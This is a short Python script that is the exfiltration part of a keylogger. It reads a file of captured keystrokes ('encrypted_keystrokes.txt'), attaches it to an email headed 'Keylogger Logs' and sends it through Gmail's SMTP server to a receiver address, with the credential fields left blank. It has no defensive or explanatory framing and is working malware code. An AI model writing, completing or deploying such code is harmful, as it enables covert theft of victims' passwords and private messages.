import smtplib
from email.message import EmailMessage

sender_email = ""
receiver_email = ""
email_password = ""

smtp_server = "smtp.gmail.com"
smtp_port = 465

def send_log_email():
    try:
        msg = EmailMessage()
        msg["Subject"] = "Keylogger Logs"
        msg["From"] = sender_email
        msg["To"] = receiver_email
        msg.set_content("Attached are the encrypted keystroke logs.")

        # Attach the log file
        log_file = "encrypted_keystrokes.txt"
        with open(log_file, "rb") as f:
            msg.add_attachment(f.read(), maintype="application", subtype="octet-stream", filename=log_file)

        # Connect and send the email
        with smtplib.SMTP_SSL(smtp_server, smtp_port) as smtp:
            smtp.login(sender_email, email_password)
            smtp.send_message(msg)
        print("Email sent successfully!")

    except Exception as e:
        print("Failed to send email:", e)

send_log_email()